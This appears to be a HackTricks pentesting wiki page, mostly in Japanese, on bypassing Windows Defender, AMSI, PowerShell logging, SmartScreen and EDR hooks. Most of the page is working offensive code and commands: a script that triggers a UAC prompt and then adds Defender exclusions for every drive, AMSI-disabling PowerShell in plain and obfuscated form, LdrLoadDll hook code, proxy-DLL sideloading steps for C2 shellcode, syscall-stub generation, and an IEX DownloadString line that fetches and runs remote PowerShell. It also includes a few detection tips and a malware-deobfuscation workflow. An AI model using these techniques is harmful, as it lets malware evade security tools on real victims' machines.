# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was initially written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender の動作を停止する tool。
- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を装って Windows Defender の動作を停止する tool。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender を改変する前に実行する Installer-style UAC bait

game cheats を装う公開 loader は、unsigned の Node.js/Nexe installer として配布されることが多く、最初に **user に elevation を要求**し、その後で Defender を無効化します。流れは単純です。

1. `net session` で administrative context を確認します。この command は caller が admin rights を持っている場合にのみ成功するため、失敗した場合は loader が standard user として実行されていることを示します。
2. 元の command line を維持したまま、`RunAs` verb で自身を直ちに再起動し、想定された UAC consent prompt を表示します。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
被害者はすでに「cracked」ソフトウェアをインストールしていると考えているため、通常このプロンプトを受け入れ、malware に Defender のポリシーを変更するために必要な権限を与えてしまいます。<sup>[[26]](#references)</sup>

### すべてのドライブレターに対する `MpPreference` の一括除外

権限を昇格させた後、GachiLoader-style の chain はサービスを完全に無効化するのではなく、Defender の盲点を最大限に広げます。loader はまず GUI watchdog（`taskkill /F /IM SecHealthUI.exe`）を終了させ、次に **極めて広範な除外** を追加します。これにより、すべての user profile、system directory、removable disk がスキャン不能になります。
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
主な観察事項：

- この loop はマウントされているすべての filesystem（D:\、E:\、USB sticks など）を走査するため、**今後ディスク上のどこに payload が配置されても無視されます**。
- `.sys` extension の除外は将来を見据えたもので、attackers は再び Defender に触れることなく、後から unsigned drivers を load できる選択肢を確保します。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 配下に反映されるため、後続 stages で exclusions が維持されていることを確認したり、UAC を再度 trigger せずに拡張したりできます。

Defender service は停止されないため、単純な health checks では「antivirus active」と報告され続けますが、実際の real-time inspection はそれらの paths に一切適用されません。<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

現在、AVs はファイルが malicious かどうかを確認するために、static detection、dynamic analysis、さらに高度な EDRs では behavioural analysis など、さまざまな methods を使用しています。

### **Static detection**

Static detection は、binary や script 内の既知の malicious strings または byte arrays を検出し、さらにファイル自体から情報（file description、company name、digital signatures、icon、checksum など）を抽出することで実現されます。つまり、既知の public tools を使用すると、すでに分析されて malicious として flag されている可能性が高いため、より簡単に検出されます。この種の detection を回避する方法はいくつかあります。

- **Encryption**

binary を encrypt すれば、AV がプログラムを検出する方法はなくなりますが、decrypt して memory 内でプログラムを実行するための何らかの loader が必要になります。

- **Obfuscation**

場合によっては、binary や script 内のいくつかの strings を変更するだけで AV を通過できますが、obfuscate する対象によっては時間のかかる作業になります。

- **Custom tooling**

独自の tools を開発すれば、既知の bad signatures は存在しませんが、多くの時間と労力が必要です。

> [!TIP]
> Windows Defender の static detection に対して確認するには、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) が有効です。基本的にはファイルを複数の segments に分割し、それぞれを個別に Defender に scan させます。これにより、binary 内でどの strings や bytes が flag されたのかを正確に確認できます。

実践的な AV Evasion については、この [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) をぜひ確認することを強くおすすめします。

### **Dynamic analysis**

Dynamic analysis とは、AV が sandbox 内で binary を実行し、malicious activity（browser の passwords を decrypt して読み取ろうとする、LSASS に対して minidump を実行するなど）を監視することです。この部分は少し扱いが難しくなりますが、sandbox を回避するためにできることをいくつか紹介します。

- **Sleep before execution** 実装方法によっては、AV の dynamic analysis を bypass する優れた方法になります。AVs が files を scan できる時間は、user の workflow を中断しないよう非常に短く設定されています。そのため、長い sleep を使用すると binary の analysis を妨げられます。ただし、多くの AV sandboxes は実装方法によって sleep を skip できます。
- **Checking machine's resources** 通常、sandboxes は user の machine の動作を遅くしないよう、利用できる resources が非常に少なく設定されています（例：< 2GB RAM）。ここでは非常に創造的な方法も使えます。たとえば CPU の temperature や fan speeds を確認する方法です。sandbox ではすべてが実装されているとは限りません。
- **Machine-specific checks** workstation が `"contoso.local"` domain に join している user を target にしたい場合、computer の domain を確認し、指定したものと一致するかを check できます。一致しなければ、program を exit させます。

Microsoft Defender の Sandbox computername は HAL9TH であることが判明しています。そのため、detonation 前に malware から computer name を確認できます。名前が HAL9TH と一致する場合、Defender の sandbox 内にいることを意味するため、program を exit させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes に対抗するための、[@mgeeky](https://twitter.com/mariuszbit) によるその他の非常に優れた tips

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この post で前述したとおり、**public tools** は最終的に **detected されます**。そのため、次のことを自問してください。

たとえば LSASS を dump したい場合、**本当に mimikatz を使う必要がありますか**？ それとも、あまり知られておらず、LSASS も dump できる別の project を使えるでしょうか。

おそらく後者が正しい answer です。mimikatz を例にすると、AVs や EDRs によって最も多く flag されている malware の一つ、あるいは最も flag されている malware である可能性があります。project 自体は非常に優れていますが、AVs を回避するために扱うのは nightmare でもあります。そのため、達成したい目的に対する alternatives を探してください。

> [!TIP]
> evasion のために payloads を modify するときは、Defender の **automatic sample submission を無効にする**ようにしてください。また、長期的に evasion を達成することが目的なら、真剣に、**VIRUSTOTAL に UPLOAD しないでください**。特定の AV によって payload が detected されるか確認したい場合は、その AV を VM に install し、automatic sample submission を無効にしてから、結果に満足するまでそこで test してください。

## EXEs vs DLLs

可能な場合は常に、evasion のために **DLLs の使用を優先してください**。私の経験では、DLL files は通常 **検出および分析される可能性がはるかに低い**ため、payload に DLL として実行する方法がある場合、検出を回避する非常に簡単な trick になります。

この image からわかるように、Havoc の DLL Payload は antiscan.me で 4/26 の detection rate であるのに対し、EXE payload の detection rate は 7/26 です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

ここからは、DLL files を使用してさらに stealthier にするための tricks をいくつか紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** は、loader が使用する DLL search order を利用し、victim application と malicious payload(s) を隣接して配置します。

[Siofra](https://github.com/Cybereason/siofra) と次の powershell script を使用すると、DLL Sideloading の影響を受けやすい programs を確認できます。
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは、`"C:\Program Files\\"` 内で DLL hijacking の影響を受けるプログラムの一覧と、それらがロードしようとする DLL ファイルを出力します。

**DLL Hijackable/Sideloadable programs** は、ぜひ自分で**調査する**ことを強くおすすめします。この technique は適切に実行すれば非常に stealthy ですが、publicly known な DLL Sideloadable programs を使用すると、簡単に発見される可能性があります。

プログラムがロードを想定している名前の malicious DLL を配置するだけでは、payload はロードされません。これは、プログラムがその DLL 内に特定の functions が存在することを想定しているためです。この問題を解決するために、**DLL Proxying/Forwarding** と呼ばれる別の technique を使用します。

**DLL Proxying** は、プログラムが行う calls を proxy（および malicious）DLL から original DLL へ転送します。これにより、プログラムの functionality を維持しながら、payload の execution を処理できます。

ここでは、[@flangvik](https://twitter.com/Flangvik) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project を使用します。

以下は、私が実行した手順です:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドにより、2つのファイルが生成されます。DLL source code templateと、名前を変更した元のDLLです。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
これらが結果です：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

[SGN](https://github.com/EgeBalci/sgn)でエンコードしたshellcodeとproxy DLLは、どちらも[antiscan.me](https://antiscan.me)でDetection rateが0/26でした！これは成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloadingについての[S3cur3Th1sSh1tのtwitch VOD](https://www.twitch.tv/videos/1644171543)と、さらに詳しく学ぶために[ippsecのvideo](https://www.youtube.com/watch?v=3eROsG_WNpE)も**強くおすすめします**。

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modulesは、実際には「forwarders」であるfunctionをexportできます。codeを指す代わりに、export entryには`TargetDll.TargetFunc`形式のASCII stringが含まれます。callerがexportをresolveすると、Windows loaderは次の処理を行います：

- まだloadされていない場合は`TargetDll`をloadする
- そこから`TargetFunc`をresolveする

理解しておくべき主な挙動：
- `TargetDll`がKnownDLLの場合、保護されたKnownDLLs namespace（例：ntdll、kernelbase、ole32）から提供される。<sup>[[15]](#references)</sup>
- `TargetDll`がKnownDLLでない場合は、通常のDLL search orderが使用される。これにはforward resolutionを実行しているmoduleのdirectoryも含まれる。

これにより、間接的なsideloading primitiveが可能になります。つまり、functionがnon-KnownDLL module nameへforwardされているsigned DLLを見つけ、そのsigned DLLと、forwarded target moduleとまったく同じ名前のattacker-controlled DLLを同じdirectoryに配置します。forwarded exportがinvokeされると、loaderはforwardをresolveし、同じdirectoryからあなたのDLLをloadしてDllMainを実行します。<sup>[[13]](#references)</sup>

Windows 11で確認された例：
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC (copy-paste):
1) 署名付きシステム DLL を書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を配置します。コード実行には最小限の DllMain で十分であり、DllMain をトリガーするために転送関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名付き LOLBin で forward をトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) が side-by-side の `keyiso.dll` (signed) をロードする
- `KeyIsoSetAuditingInterface` の解決中に、loader が `NCRYPTPROV.SetAuditingInterface` への forward をたどる
- その後 loader が `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、`DllMain` がすでに実行された後にのみ「missing API」エラーが発生する

Hunting tips:
- 対象モジュールが KnownDLL ではない forwarded exports に注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` の下に一覧表示されている。
- 次のような tooling を使用して forwarded exports を列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を検索するには、Windows 11 forwarder inventoryを参照します: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Detection/defense ideas:
- LOLBins（例: rundll32.exe）が、非システムパスからsigned DLLsをloadした後、そのディレクトリから同じbase nameを持つKnownDLLsではないDLLをloadする動作を監視する
- `rundll32.exe` → 非システムの`keyiso.dll` → user-writable paths配下の`NCRYPTPROV.dll`のようなprocess/module chainをalertする
- code integrity policies（WDAC/AppLocker）を適用し、application directoriesでのwrite+executeを拒否する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freezeは、suspended processes、direct syscalls、alternative execution methodsを使用してEDRsをbypassするためのpayload toolkitです。`

Freezeを使用すると、shellcodeをstealthyな方法でloadしてexecuteできます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionは単なるいたちごっこです。今日有効なものが明日には検出される可能性があるため、1つのtoolだけに依存しないでください。可能であれば、複数のevasion techniqueを連鎖させてみてください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRは、`ntdll.dll`のsyscall stubに**user-mode inline hook**を配置することがよくあります。これらのhookをbypassするには、正しい**SSN**（System Service Number）を読み込み、hookされたexport entrypointを実行せずにkernel modeへtransitionする**direct**または**indirect syscall stub**を生成できます。<sup>[[32]](#references)</sup>

**Invocation options:**
- **Direct (embedded)**: 生成されたstubに`syscall`/`sysenter`/`SVC #0`命令を埋め込みます（`ntdll` exportには到達しません）。
- **Indirect**: `ntdll`内にある既存の`syscall` gadgetへjumpし、kernel transitionが`ntdll`から開始されたように見せます（heuristic evasionに有用です）。**randomized indirect**では、callごとにpoolからgadgetを選択します。
- **Egg-hunt**: staticな`0F 05` opcode sequenceをdisk上に埋め込むことを避け、runtimeにsyscall sequenceをresolveします。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytesを読み取る代わりに、syscall stubをvirtual addressの順序でsortしてSSNを推測します。
- **SyscallsFromDisk**: cleanな`\KnownDlls\ntdll.dll`をmapし、その`.text`からSSNを読み取ってからunmapします（memory内のすべてのhookをbypassします）。
- **RecycledGate**: VA-sorted SSN inferenceと、stubがcleanな場合のopcode validationを組み合わせます。hookされている場合はVA inferenceにfallbackします。
- **HW Breakpoint**: `syscall`命令にDR0を設定し、VEHを使用してruntimeに`EAX`からSSNを取得します。hookされたbytesをparseする必要はありません。

SysWhispers4の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSIは「[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作られました。当初、AVは**ディスク上のファイル**のみをスキャンできたため、何らかの方法でpayloadを**直接メモリ上で**実行できれば、AVにはそれを防ぐ手段がありませんでした。十分な可視性がなかったためです。

AMSI機能は、Windowsの以下のコンポーネントに統合されています。

- User Account Control、またはUAC（EXE、COM、MSI、またはActiveXのインストールの昇格）
- PowerShell（script、対話的な使用、動的なコード評価）
- Windows Script Host（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBA macro

これにより、antivirusソリューションは、暗号化も難読化もされていない形式でscriptの内容を公開することで、scriptの動作を検査できます。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで以下のalertが発生します。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`に続けて、そのscriptを実行したexecutableへのpathが付加されていることに注目してください。この場合はpowershell.exeです。

ディスクにファイルを一切保存していませんが、それでもAMSIによってメモリ上で検出されました。

さらに、**.NET 4.8**以降では、C# codeもAMSIを通過します。これは、`Assembly.Load(byte[])`によるメモリ上での実行にも影響します。そのため、AMSIを回避したい場合、メモリ上での実行にはより低いバージョンの.NET（4.7.2以下など）を使用することが推奨されます。

AMSIを回避する方法はいくつかあります。

- **Obfuscation**

AMSIは主にstatic detectionで動作するため、loadしようとしているscriptを変更することは、detectionを回避する良い方法になります。

ただし、AMSIには、複数のlayerがある場合でもscriptのobfuscationを解除する機能があります。そのため、どのように実施するかによっては、obfuscationは悪い選択肢になる可能性があります。これにより、回避はそれほど単純ではありません。一方で、場合によっては、いくつかのvariable名を変更するだけで十分なこともあるため、どの程度flagが立てられているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（およびcscript.exe、wscript.exeなど）のprocessにloadすることで実装されているため、unprivileged userとして実行していても簡単にtamperできます。AMSIの実装にはこの欠陥があるため、researcherたちはAMSI scanningを回避する複数の方法を発見しています。

**Forcing an Error**

AMSIのinitializationを失敗させる（amsiInitFailed）と、現在のprocessではscanが開始されなくなります。当初、これは[Matt Graeber](https://twitter.com/mattifestation)によって公開され、Microsoftはより広範な使用を防ぐためのsignatureを開発しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
PowerShell codeを1行実行するだけで、現在のPowerShellプロセスでAMSIを使用不能にできました。もちろん、この行自体はAMSIによって検出されるため、この technique を使用するには何らかの変更が必要です。

以下は、この[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)から取得した、modified AMSI bypassです。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

この technique は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。これは、amsi.dll 内の "AmsiScanBuffer" function（user-supplied input の scan を担当）の address を見つけ、E_INVALIDARG の code を返す instructions で上書きするものです。これにより、実際の scan の結果は 0 を返し、clean result として解釈されます。

> [!TIP]
> より詳細な説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

AMSI を powershell で bypass するために使用される他の technique も多数あります。詳細については、[**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を確認してください。

### amsi.dll の load を防止して AMSI を block（LdrLoadDll hook）

AMSI は `amsi.dll` が current process に load された後にのみ initialise されます。robust で language‑agnostic な bypass は、`ntdll!LdrLoadDll` に user-mode hook を配置し、requested module が `amsi.dll` の場合に error を返すことです。その結果、AMSI は load されず、その process では scan が発生しません。<sup>[[23]](#references)</sup>

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
メモ
- PowerShell、WScript/CScript、custom loaders のいずれでも機能します（それ以外の場合に AMSI を load するものすべて）。
- stdin 経由で scripts を渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせると、長い command-line artefacts を避けられます。
- LOLBins を通じて実行される loaders での使用例が確認されています（例：`regsvr32` が `DllRegisterServer` を呼び出す場合）。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** tool は AMSI を bypass する script も生成します。
**[https://amsibypass.com/](https://amsibypass.com/)** tool は、randomized user-defined function、variables、characters expression を使用し、PowerShell keywords の character casing に random 化を適用して signature を回避する、AMSI を bypass する script も生成します。

**検出された signature を削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** などの tool を使用して、current process の memory から検出された AMSI signature を削除できます。この tool は、current process の memory を AMSI signature について scan し、その後 NOP instructions で overwrite することで動作し、実質的に memory から削除します。

**AMSI を使用する AV/EDR products**

AMSI を使用する AV/EDR products の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell version 2 を使用する**
PowerShell version 2 を使用すると AMSI は load されないため、AMSI に scan されずに scripts を実行できます。次のように実行できます：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell loggingは、システム上で実行されたすべてのPowerShellコマンドを記録できる機能です。これは監査やトラブルシューティングに役立ちますが、**検知を回避したい攻撃者にとっては問題**にもなります。

PowerShell loggingをバイパスするには、次の手法を使用できます。

- **PowerShell TranscriptionとModule Loggingを無効化する**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)などのツールを使用できます。
- **PowerShell version 2を使用する**: PowerShell version 2を使用するとAMSIがロードされないため、AMSIによるスキャンなしでスクリプトを実行できます。次のように実行します: `powershell.exe -version 2`
- **unmanaged PowerShell sessionを使用する**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)を使用すると、`powershell.exe`を起動せずにPowerShellをホストできます（Cobalt Strikeの`powerpick`で使用されるアプローチ）。これにより、`powershell.exe`プロセスに特化した制御は回避できますが、AMSI、Script Block Logging、その他すべてのPowerShell防御が自動的に無効になるわけではありません。対応範囲はruntimeとhostの実装に依存します。


## Obfuscation

> [!TIP]
> 複数のobfuscation手法ではデータの暗号化を使用するため、binaryのentropyが増加し、AVやEDRによる検知が容易になります。この点に注意し、暗号化は機密性がある、または隠す必要があるコードの特定セクションにのみ適用することを検討してください。

### ConfuserEx-Protected .NET BinariesのDeobfuscating

ConfuserEx 2（または商用forks）を使用するmalwareを分析する際は、decompilerやsandboxを妨害する複数の保護レイヤーに遭遇することがよくあります。以下のworkflowにより、**ほぼ元のILを確実に復元**でき、その後、dnSpyやILSpyなどのツールでC#にdecompileできます。<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserExはすべての*method body*を暗号化し、*module*のstatic constructor（`<Module>.cctor`）内部で復号します。また、PE checksumもpatchするため、変更を加えるとbinaryがcrashします。**AntiTamperKiller**を使用して、暗号化されたmetadata tablesを特定し、XOR keysを復元して、cleanなassemblyを書き換えます:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には6つのanti-tamper parameters（`key0-key3`、`nameHash`、`internKey`）が含まれます。これらは独自のunpackerを構築する際に役立ちます。

2.  Symbol / control-flow recovery – *clean* fileを**de4dot-cex**（ConfuserEx対応のde4dot fork）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profileを選択
• de4dotはcontrol-flow flatteningを元に戻し、元のnamespace、class、variable nameを復元し、constant stringを復号します。

3.  Proxy-call stripping – ConfuserExは、decompilationをさらに妨害するため、直接のmethod callを軽量なwrapper（別名*proxy calls*）に置き換えます。**ProxyCall-Remover**で削除します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
この手順の後は、不透明なwrapper functions（`Class8.smethod_10`、…）ではなく、`Convert.FromBase64String`や`AES.Create()`などの通常の.NET APIが確認できるはずです。

4.  Manual clean-up – 結果のbinaryをdnSpyで実行し、large Base64 blobsや`RijndaelManaged`/`TripleDESCryptoServiceProvider`の使用箇所を検索して、*real* payloadを特定します。malwareは、`<Module>.byte_0`内部で初期化されるTLV-encoded byte arrayとして保存していることがよくあります。

上記のchainにより、malicious sampleを実行せずにexecution flowを復元できます。これはoffline workstationで作業する際に便利です。

> 🛈  ConfuserExは`ConfusedByAttribute`というcustom attributeを生成します。これはIOCとして使用し、sampleを自動的にtriageできます。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)と改ざん防止によってソフトウェアセキュリティを向上させられる、[LLVM](http://www.llvm.org/) compilation suiteのオープンソースフォークを提供することです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使用したりcompilerを変更したりせずに、`C++11/14` languageを使用してcompile時にobfuscated codeを生成する方法を実証します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming frameworkによって生成されたobfuscated operationsのlayerを追加し、applicationをcrackしようとする者の作業を少し困難にします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysを含むさまざまなpe filesをobfuscateできるx64 binary obfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意のexecutables向けのシンプルなmetamorphic code engineです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP (return-oriented programming)を使用するLLVM-supported languages向けのfine-grained code obfuscation frameworkです。ROPfuscatorは、通常のinstructionsをROP chainsに変換することでassembly code levelでprogramをobfuscateし、通常のcontrol flowに対する自然な認識を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): NimcryptはNimで記述された.NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは既存のEXE/DLLをshellcodeに変換してからloadできます。

## SmartScreen と MoTW

インターネットから一部のexecutablesをdownloadして実行するときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreenは、潜在的にmaliciousなapplicationsの実行からend userを保護するためのsecurity mechanismです。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にreputation-based approachで動作します。つまり、あまり一般的でないdownload applicationsはSmartScreenをtriggerし、end userにalertを表示してfileの実行を防ぎます（ただし、More Info -> Run anywayをクリックすればfileは実行できます）。

**MoTW** (Mark of The Web)は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)であり、インターネットからfilesをdownloadすると、download元のURLとともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption>インターネットからdownloadしたfileのZone.Identifier ADSを確認しています。</figcaption></figure>

> [!TIP]
> **trusted** signing certificateで署名されたexecutablesは、**SmartScreenをtriggerしない**ことに注意してください。

payloadがMark of The Webを取得しないようにする非常に効果的な方法は、ISOのような何らかのcontainer内にpayloadをpackagingすることです。これは、Mark-of-the-Web (MOTW)を**non NTFS** volumesに適用することが**できない**ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するためにpayloadsをoutput containersにpackagingするtoolです。

使用例:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

